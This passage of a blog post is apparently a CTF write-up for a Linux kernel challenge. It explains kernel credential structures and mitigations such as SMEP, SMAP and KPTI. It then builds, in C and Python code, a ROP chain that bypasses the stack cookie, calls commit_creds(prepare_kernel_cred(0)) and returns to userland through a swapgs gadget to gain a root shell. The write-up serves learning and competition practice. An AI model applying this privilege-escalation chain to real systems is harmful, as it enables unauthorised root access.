<span style="display:block;width:100%;background-color:#3d3f4a"><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">25</span>    <span style="color:#ff79c6">const</span> <span style="color:#ff79c6">struct</span> cred __rcu  <span style="color:#ff79c6">*</span>real_cred;
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">26</span>
<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">27</span>    <span style="color:#6272a4">/* Effective (overridable) subjective task credentials (COW): */</span>
<span style="display:block;width:100%;background-color:#3d3f4a"><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">28</span>    <span style="color:#ff79c6">const</span> <span style="color:#ff79c6">struct</span> cred __rcu  <span style="color:#ff79c6">*</span>cred;
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">29</span>	<span style="color:#6272a4">// ...
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">30</span><span style="color:#6272a4"></span>};
</code></pre></div><p>In this <strong>task_struct</strong> structure we have the process credentials which hold the <strong>effective user id</strong>.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c"><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1</span><span style="color:#ff79c6">struct</span> cred {
<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2</span>    atomic_t    usage;
<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3</span>    kuid_t   	 uid;   	 <span style="color:#6272a4">/* real UID of the task */</span>
<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4</span>    kgid_t   	 gid;   	 <span style="color:#6272a4">/* real GID of the task */</span>
<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5</span>    kuid_t   	 suid;   	 <span style="color:#6272a4">/* saved UID of the task */</span>
<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6</span>    kgid_t   	 sgid;   	 <span style="color:#6272a4">/* saved GID of the task */</span>
<span style="display:block;width:100%;background-color:#3d3f4a"><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7</span>    kuid_t   	 euid;   	 <span style="color:#6272a4">/* effective UID of the task */</span>
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8</span>    kgid_t   	 egid;   	 <span style="color:#6272a4">/* effective GID of the task */</span>
<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9</span>    kuid_t   	 fsuid;   	 <span style="color:#6272a4">/* UID for VFS ops */</span>
<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10</span>    kgid_t   	 fsgid;   	 <span style="color:#6272a4">/* GID for VFS ops */</span>
<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11</span>    <span style="color:#8be9fd">unsigned</span>    securebits;    <span style="color:#6272a4">/* SUID-less security management */</span>
<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12</span>    kernel_cap_t    cap_inheritable; <span style="color:#6272a4">/* caps our children can inherit */</span>
<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13</span>    kernel_cap_t    cap_permitted;    <span style="color:#6272a4">/* caps we&#39;re permitted */</span>
<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14</span>    kernel_cap_t    cap_effective;    <span style="color:#6272a4">/* caps we can actually use */</span>
<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15</span>    kernel_cap_t    cap_bset;    <span style="color:#6272a4">/* capability bounding set */</span>
<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">16</span>    kernel_cap_t    cap_ambient;    <span style="color:#6272a4">/* Ambient capability set */</span>
<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">17</span>	<span style="color:#6272a4">// ...
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">18</span><span style="color:#6272a4"></span>};
<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">19</span>
</code></pre></div><p>For the root user the <strong>effective user id</strong> is <strong>0</strong>, in other words if we can change the value of <strong>current_task-&gt;creds-&gt;euid</strong> to <strong>0</strong>, then the current process will become root.
After setting the effective user id of the current process to zero, we have to safely return to userland and then only we will be able get a root shell.</p>
<p>Let&rsquo;s also discuss about the mitigations implemented in the Linux Kernel.</p>
<ol>
<li>
<p>K ernel Address Space Layout Randomization (<strong>KASLR</strong>) - it randomizes the base address of the kernel each time the system is rebooted.</p>
</li>
<li>
<p>Kernel Stack Cookies (<strong>CANARIES</strong>) - Mitigation to protect against stack based buffer overflow attacks, exactly similar to userland.</p>
</li>
<li>
<p>Supervisor Mode Execution Protection (<strong>SMEP</strong>) - this feature marks all the userland pages in the page table as non-executable when the process is in kernel-mode. In the kernel, this is enabled by setting the 20th bit of Control register <strong>CR4</strong>.</p>
</li>
<li>
<p>Supervisor Mode Access Prevention (<strong>SMAP</strong>) - this feature marks all the userland pages in the page table as non-accessible when the process is in kernel-mode, which means they cannot be read or written as well. In the kernel, this is enabled by setting the 21st bit of Control register <strong>CR4</strong>.</p>
</li>
<li>
<p>Kernel Page-Table Isolation (<strong>KPTI</strong>) - this feature separates user-space and kernel-space page tables entirely, instead of using just one set of page tables that contain both user-space and kernel-space addresses. One set of page tables includes both kernel-space and user-space addresses asame as before, but it is only used when the system is running in kernel mode. The seconds set of page tables for use in the user mode contains a copy of user-space and a minimal set of kernel-space addresses.</p>
</li>
</ol>
<p>(Ref. <a href="https://lkmidas.github.io/posts/20210123-linux-kernel-pwn-part-1/">lkmidas.github.io</a>)</p>
<p>We understood that to gain a root shell we need to set the <strong>current_task-&gt;cred-&gt;euid</strong> to <strong>0</strong>, we can do it in 2 ways, the harder way or the easier way.
The harder way is to craft a ropchain that gets the address of current_task and then we access the individual members to reach the euid member and then we set that to zero.
The easier way is to call <strong>prepare_kernel_cred(struct task_struct * reference_task_stuct)</strong> function with <strong>NULL</strong> as its argument and it will return a <strong>cred</strong> struct which has its euid set to <strong>0</strong>, which is exactly what we want.
But how do we set this new cred struct to our process? we can do that by passing the returned cred struct to a function called <strong>commit_creds(stuct cred * )</strong>. The credentials are supposed to be immutable (i.e., they can be caches elsewhere, and shouldn&rsquo;t be updated in place). Instead, they can be replaced.</p>
<p>So, in theory we just do <strong>commit_creds(prepare_kernel_cred(0));</strong> to get root shell.</p>
<h3 id="give-me-root">Give me root.</h3>
<p>At this point, we have everything that we need. We have Kernel Base, we have kernel stack cookie, we have address of <strong>prepare_kernel_cred</strong> and <strong>commit_creds</strong>.
Let&rsquo;s get the root shell.</p>
<p>First let&rsquo;s figure out the offset in the stack where we need to overwrite the stack cookie.</p>
<p>One way to figure it out is if we see the disassembly of the swrite function, where it was writing the cookie on the stack.</p>



<div class="center">
  <img
    class="responsive"
    src="/img/easy_kernel/cookie2.png"
    alt="cookie2"
    decoding="async"
  />
</div>
<p>You can see its writing the cookie at an offset of 0x80. So, this was one way to figure out.
One other method is to use the output of <strong>pwn cyclic 0x400</strong> by sending this output to the kernel stack and see what was our cookie overwritten with and then calculate the offset of the cookie from this cyclic pattern.</p>
<p>You can use the similar method to figure out the offset of return address.</p>
<p>Offset of stack cookie turns out to be 0x80 and offset of return address turns out to be 0x90.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c"><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1</span>    <span style="color:#8be9fd">int</span> cookie_offset <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">0x80</span><span style="color:#ff79c6">/</span><span style="color:#bd93f9">8</span>; 
<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2</span>    <span style="color:#8be9fd">int</span> return_offset <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">0x90</span><span style="color:#ff79c6">/</span><span style="color:#bd93f9">8</span>;
</code></pre></div><p>We divide the offset by 8 because only then it will become the index in our exploit buffer which is an array of unsigned long.</p>
<p>So our ROP Chain would look something like this</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1</span>    exploit <span style="color:#ff79c6">=</span> pwn<span style="color:#ff79c6">.</span>cyclic(<span style="color:#bd93f9">0x80</span>) <span style="color:#6272a4"># offset for cookie</span>
<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2</span>    exploit <span style="color:#ff79c6">+=</span> pwn<span style="color:#ff79c6">.</span>p64(stack_cookie)
<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3</span>    exploit <span style="color:#ff79c6">+=</span> pwn<span style="color:#ff79c6">.</span>p64(<span style="color:#bd93f9">0</span>) <span style="color:#6272a4"># rbx</span>
<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4</span>    exploit <span style="color:#ff79c6">+=</span> pwn<span style="color:#ff79c6">.</span>p64(POP_RDI) <span style="color:#6272a4"># rdi = NULL</span>
<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5</span>    exploit <span style="color:#ff79c6">+=</span> pwn<span style="color:#ff79c6">.</span>p64(<span style="color:#bd93f9">0</span>)
<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6</span>    exploit <span style="color:#ff79c6">+=</span> pwn<span style="color:#ff79c6">.</span>p64(prepare_kernel_cred)
<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7</span>    exploit <span style="color:#ff79c6">+=</span> pwn<span style="color:#ff79c6">.</span>p64(MOV_RDI_RAX) <span style="color:#6272a4"># mov the returned cred structure</span>
<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8</span>                                    <span style="color:#6272a4"># in rdi to be the argument for commit_creds</span>
<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9</span>    exploit <span style="color:#ff79c6">+=</span> pwn<span style="color:#ff79c6">.</span>p64(commit_creds)
<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10</span>    exploit <span style="color:#ff79c6">+=</span> pwn<span style="color:#ff79c6">.</span>p64(somehow_return_to_userland_safely)
</code></pre></div><p>You can easily find the <strong>POP_RDI</strong> gadget but finding the <strong>MOV_RDI_RAX</strong> gadget is hard.
But you would find this gadget instead of &ldquo;<strong>mov rdi, rax ; ret</strong>&rdquo;.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-asm" data-lang="asm"><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1</span>    <span style="color:#50fa7b">mov</span> rdi, rax
<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2</span>    <span style="color:#50fa7b">jne</span> <span style="color:#bd93f9">0xffffffff813b34f1</span>
<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3</span>    <span style="color:#50fa7b">xor</span> eax, eax
<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">4</span>    <span style="color:#50fa7b">ret</span>
</code></pre></div><p>And right away you can notice an issue with this gadget, which is the jne instruction.
zero flag must be set so that we don&rsquo;t take the jump and safely return from the gadget.
To do just that we have to find these gadgets.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-asm" data-lang="asm"><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1</span>    <span style="color:#50fa7b">pop</span> rdx
<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2</span>    <span style="color:#50fa7b">ret</span>
</code></pre></div><div class="highlight"><pre style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-asm" data-lang="asm"><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1</span>    <span style="color:#50fa7b">cmp</span> rdx, <span style="color:#bd93f9">8</span>
<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2</span>    <span style="color:#50fa7b">jne</span> <span style="color:#bd93f9">0xffffffff81a3003e</span>
<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3</span>    <span style="color:#50fa7b">ret</span> 
</code></pre></div><p>These two gadgets allows us to set the zero flag. We can chain these gadgets together to execute the <strong>MOV_RDI_RAX</strong> gadget.</p>
<p>Our new ROP Chain would look like this.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1</span>    exploit <span style="color:#ff79c6">=</span> pwn<span style="color:#ff79c6">.</span>cyclic(<span style="color:#bd93f9">0x80</span>) <span style="color:#6272a4"># offset for cookie</span>
<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2</span>    exploit <span style="color:#ff79c6">+=</span> pwn<span style="color:#ff79c6">.</span>p64(stack_cookie)
<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3</span>    exploit <span style="color:#ff79c6">+=</span> pwn<span style="color:#ff79c6">.</span>p64(<span style="color:#bd93f9">0</span>) <span style="color:#6272a4"># rbx</span>
<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4</span>    exploit <span style="color:#ff79c6">+=</span> pwn<span style="color:#ff79c6">.</span>p64(POP_RDI) <span style="color:#6272a4"># rdi = NULL</span>
<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5</span>    exploit <span style="color:#ff79c6">+=</span> pwn<span style="color:#ff79c6">.</span>p64(<span style="color:#bd93f9">0</span>)
<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6</span>    exploit <span style="color:#ff79c6">+=</span> pwn<span style="color:#ff79c6">.</span>p64(prepare_kernel_cred)
<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7</span>    exploit <span style="color:#ff79c6">+=</span> pwn<span style="color:#ff79c6">.</span>p64(POP_RDX)
<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8</span>    exploit <span style="color:#ff79c6">+=</span> pwn<span style="color:#ff79c6">.</span>p64(<span style="color:#bd93f9">8</span>)
<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9</span>    exploit <span style="color:#ff79c6">+=</span> pwn<span style="color:#ff79c6">.</span>p64(CMP_RDX_8)
<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10</span>    exploit <span style="color:#ff79c6">+=</span> pwn<span style="color:#ff79c6">.</span>p64(MOV_RDI_RAX) <span style="color:#6272a4"># mov the returned cred structure</span>
<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11</span>                                    <span style="color:#6272a4"># in rdi to be the argument for commit_creds</span>
<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12</span>    exploit <span style="color:#ff79c6">+=</span> pwn<span style="color:#ff79c6">.</span>p64(commit_creds)
<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13</span>    exploit <span style="color:#ff79c6">+=</span> pwn<span style="color:#ff79c6">.</span>p64(somehow_return_to_userland_safely)
</code></pre></div><p>There is still one gadget missing, which is the &ldquo;<strong>somehow_return_to_userland_safely</strong>&rdquo; gadget.
We will discuss about that later, first let&rsquo;s build this rop chain in our exploit.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c"><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1</span>
<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2</span><span style="color:#ff79c6">#define PAGE_SIZE           0x001000
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3</span><span style="color:#ff79c6">#define POP_RAX             0x00dc1e </span><span style="color:#6272a4">/* pop rax ; ret */</span><span style="color:#ff79c6">
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4</span><span style="color:#ff79c6">#define POP_RDI             0x001518 </span><span style="color:#6272a4">/* pop rdi ; ret */</span><span style="color:#ff79c6">
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5</span><span style="color:#ff79c6">#define POP_RDX             0x034b72 </span><span style="color:#6272a4">/* pop rdx ; ret */</span><span style="color:#ff79c6">
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6</span><span style="color:#ff79c6">#define MOV_RDI_RAX         0x3b3504 </span><span style="color:#6272a4">/* mov rdi, rax ; jne 0xffffffff813b34f1 ; xor eax, eax ; ret */</span><span style="color:#ff79c6">
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7</span><span style="color:#ff79c6">#define CMP_RDX_8           0xa30061 </span><span style="color:#6272a4">/* cmp rdx, 8 ; jne 0xffffffff81a3003e ; ret */</span><span style="color:#ff79c6">
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8</span><span style="color:#ff79c6">#define SWAPGS_RESTORE      0xc00a45 </span><span style="color:#6272a4">/* swapgs_restore_regs_and_return_to_usermode + 22 */</span><span style="color:#ff79c6">
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9</span><span style="color:#ff79c6">#define PREPARE_KERNEL_CRED 0x0cc140 </span><span style="color:#6272a4">/* prepare_kernel_cred */</span><span style="color:#ff79c6">
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10</span><span style="color:#ff79c6">#define COMMIT_CREDS        0x0cbdd0 </span><span style="color:#6272a4">/* commit_creds */</span><span style="color:#ff79c6">
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11</span><span style="color:#ff79c6">#define KERN_BASE           0xffffffff81000000
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12</span><span style="color:#ff79c6"></span>
<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13</span><span style="color:#6272a4">/* ROP CHAIN */</span> 
<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14</span>counter <span style="color:#ff79c6">+=</span> cookie_offset <span style="color:#ff79c6">*</span> <span style="color:#bd93f9">8</span>;
<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15</span>s64(stack_cookie);
<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">16</span>counter <span style="color:#ff79c6">+=</span> return_offset <span style="color:#ff79c6">*</span> <span style="color:#bd93f9">8</span> <span style="color:#ff79c6">-</span> counter;
<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">17</span>s64(kernel_base <span style="color:#ff79c6">+</span> POP_RDI);
<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">18</span>s64(<span style="color:#bd93f9">0</span>);
<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">19</span>s64(prepare_kernel_cred);
<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">20</span>s64(kernel_base <span style="color:#ff79c6">+</span> POP_RDX);
<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">21</span>s64(<span style="color:#bd93f9">0x8</span>);
<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">22</span>s64(kernel_base <span style="color:#ff79c6">+</span> CMP_RDX_8);
<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">23</span>s64(kernel_base <span style="color:#ff79c6">+</span> MOV_RDI_RAX);
<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">24</span>s64(commit_creds);
<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">25</span>s64(<span style="color:#bd93f9">0xdeadbeeff00dbabe</span>)
</code></pre></div><p>This exploit will crash the kernel because RIP will become <strong>0xdeadbeeff00dbabe</strong>.
We still don&rsquo;t know how to safely return to the userland. If you just try to return to the <strong>get_shell</strong> function by replacing <strong>0xdeadbeeff00dbabe</strong> with the address of <strong>get_shell</strong>, then this would happen.</p>



<div class="center">
  <img
    class="responsive"
    src="/img/easy_kernel/failedexploit.png"
    alt="cookie2"
    decoding="async"
  />
</div>
<p>We triggered SMEP. We tried to execute userland code from kernel. With SMEP enabled all userland code is marked non non-executable and to bypass this we may craft a ROP chain to modify the 20th bit of the CR4 Register and only then we can go back to the userland.
But there is an easier way to go back to userland without triggering SMEP or SMAP or KPTI.</p>
<p>We have to use the <strong>swapgs_restore_regs_and_return_to_usermode</strong> gadget to switch back to userland safely.
<strong>SWAPGS</strong> in an instuction which restores user&rsquo;s GS and saves kernel pointers.</p>
<p>Specifically the gadget starts from <strong>swapgs_restore_regs_and_return_to_usermode + 22</strong>.
This is what the gadget does.</p>



<div class="center">
  <img
    class="responsive"
    src="/img/easy_kernel/swapgs.png"
    alt="cookie2"
    decoding="async"
  />
</div>
<p>You can see in this gadget at address <strong>0xffffffff81c00aa8</strong> it pops values into rax and rdi. So, we will add 2 NULLS in our rop chain after this gadget.</p>
<p><strong>IRETQ</strong> is an Interrupt return instruction which pops RIP, CS, RFLAGS, SP and SS.
So, in our rop chain we just simply add them after our <strong>swapgs_restore_regs_and_return_to_usermode</strong> gadget.</p>
<p>This is what our final rop chain looks like.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c"><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1</span>    memset(exploit, <span style="color:#f1fa8c">&#39;\0&#39;</span>, <span style="color:#bd93f9">0x1000</span>);
<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2</span>    <span style="color:#6272a4">/* ROP CHAIN */</span> 
<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3</span>    counter <span style="color:#ff79c6">+=</span> cookie_offset <span style="color:#ff79c6">*</span> <span style="color:#bd93f9">8</span>;
<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4</span>    s64(stack_cookie);
<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5</span>    counter <span style="color:#ff79c6">+=</span> return_offset <span style="color:#ff79c6">*</span> <span style="color:#bd93f9">8</span> <span style="color:#ff79c6">-</span> counter;
<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6</span>    s64(kernel_base <span style="color:#ff79c6">+</span> POP_RDI);
<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7</span>    s64(<span style="color:#bd93f9">0</span>);
<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8</span>    s64(prepare_kernel_cred);
<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9</span>    s64(kernel_base <span style="color:#ff79c6">+</span> POP_RDX);
<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10</span>    s64(<span style="color:#bd93f9">0x8</span>);
<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11</span>    s64(kernel_base <span style="color:#ff79c6">+</span> CMP_RDX_8);
<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12</span>    s64(kernel_base <span style="color:#ff79c6">+</span> MOV_RDI_RAX);
<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13</span>    s64(commit_creds);
<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14</span>    s64(kernel_base <span style="color:#ff79c6">+</span> SWAPGS_RESTORE);
<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15</span>    s64(<span style="color:#bd93f9">0</span>); <span style="color:#6272a4">/* pop rax */</span>
<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">16</span>    s64(<span style="color:#bd93f9">0</span>); <span style="color:#6272a4">/* pop rdi */</span>
<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">17</span>    s64((uint64_t)get_shell);
<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">18</span>    s64(user_cs);
<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">19</span>    s64(user_rflags);
<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">20</span>    s64(user_sp);
<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">21</span>    s64(user_ss);
<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">22</span>
<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">23</span>    <span style="color:#6272a4">/* TRIGGER BUG AND GET ROOT */</span>
<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">24</span>    do_write((<span style="color:#8be9fd">char</span> <span style="color:#ff79c6">*</span>)exploit, <span style="color:#bd93f9">0x800</span>);
</code></pre></div><p>Let&rsquo;s fire this exploit and see what happens.


<script id="asciicast-449449" src="https://asciinema.org/a/449449.js" async></script>
</p>



<div class="center">
  <img
    class="responsive"
    src="/img/easy_kernel/rootmeme.jpg"
    alt="cookie2"
    decoding="async"
  />
</div>
<p>You can find the full exploit <a href="https://gist.github.com/X3eRo0/86a628c73652ef2a94864ce2bfbb3f25">here</a></p>

        </div>



        <footer class="post-footer">
                
                
                
                <span class="post-categories">
                        <a href="https://x3ero0.github.io/categories/pwn/">Pwn</a>&emsp;
                        
                </span>
                
        
                
                
                
        </footer>
        
<table cellspacing="15" style="width:100%; border: none;">
    <tr>
        <td style="text-align: center; border: none; padding: 0px;">
        </td>
        <td style="text-align: center; border: none; padding: 0px;">
        </td>
    </tr>
</table>

        
    </article>

    

</main>


        <div class="sidebar1 widgets columns-1">

    <aside>
    
</aside>
    <aside class="widget widget_categories">
        <h2>Categories</h2>
        <ul class="widget__list"><li class="cat-item cat-item-2">
                <a href="https://x3ero0.github.io/categories/crackmes/">Crackmes (7)</a>
            </li><li class="cat-item cat-item-2">
                <a href="https://x3ero0.github.io/categories/ctf/">CTF (2)</a>
            </li><li class="cat-item cat-item-2">
                <a href="https://x3ero0.github.io/categories/pwn/">Pwn (3)</a>
            </li><li class="cat-item cat-item-2">
                <a href="https://x3ero0.github.io/categories/rev/">Rev (5)</a>
            </li>
        </ul>
    </aside>

    <aside class="widget widget_recent_entries">
        <h2>Recent Posts</h2>
        <ul>
            
                
                    <li>
                        <a href="https://x3ero0.github.io/posts/orxw_balsn_ctf_2021_pwn/">or⊕w writeup from Balsn CTF 2021</a>
                    </li>
                
            
                
                    <li>
                        <a href="https://x3ero0.github.io/posts/easy_kernel_exploitation/">Easy_Kernel Writeup from K3RN3LCTF 2021</a>
                    </li>
                
            
                
                    <li>
                        <a href="https://x3ero0.github.io/posts/hyperion/">Hyperion Writeup</a>
                    </li>
                
            
                
                    <li>
                        <a href="https://x3ero0.github.io/posts/float-writeup/">Float Writeup</a>
                    </li>
                
            
                
            
                
                    <li>
                        <a href="https://x3ero0.github.io/posts/hell86_from_ttlhacker/">Hell86 - ttlhacker</a>
                    </li>
                
            
                
                    <li>
                        <a href="https://x3ero0.github.io/posts/reversing_a_malware_in_disguise/">Reversing a malware in disguise</a>
                    </li>
                
            
                
                    <li>
                        <a href="https://x3ero0.github.io/posts/watevr_repyc/">Watevr_repyc</a>
                    </li>
                
            
                
            
                
                    <li>
                        <a href="https://x3ero0.github.io/posts/hsctf-license/">HSCTF License</a>
                    </li>
                
            
        </ul>
    </aside>

    <aside class="widget widget_recent_entries">
        <h2>Recent Crackmes</h2>
        <ul>
            
                
            
                
            
                
            
                
            
                
                    <li>
                        <a href="https://x3ero0.github.io/crackmes/fl04t/">[0x007] fl04t</a>
                    </li>
                
            
                
            
                
            
                
            
                
            
                
            
        </ul>
    </aside>
</div>

        </div>
        </div>
<footer role="contentinfo" class="document-footer contentinfo widgets columns-1">

    <aside class="widget widget_text">
        <div class="textwidget">
            <p>© x3ero0&#39;s blog</p>
        </div>
    </aside>
</footer>
</div>

    </body>
</html>
